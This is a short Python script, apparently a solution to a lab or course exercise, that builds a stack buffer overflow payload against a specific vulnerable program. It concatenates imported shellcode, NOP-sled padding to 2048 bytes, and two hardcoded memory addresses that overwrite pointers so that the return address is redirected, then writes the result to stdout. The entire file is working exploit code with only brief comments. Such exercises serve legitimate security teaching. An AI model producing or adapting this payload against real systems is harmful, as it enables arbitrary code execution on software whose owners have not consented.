import sys
from struct import pack
from shellcode import shellcode

# buffer start point from $ebp - offset: 0xFFF6E528 (a)
payload1 = pack("<I", 0xfff6e528)
# vulnerable return address from $esp (p)
payload2 = pack("<I", 0xfff6ed3c)
# filled in the rest of the buffer with padding to overwrite a and p
# to indirectly overwrite the return address
padding = b'\x90' * (2048 - len(shellcode))

sys.stdout.buffer.write(shellcode + padding + payload1 + payload2)
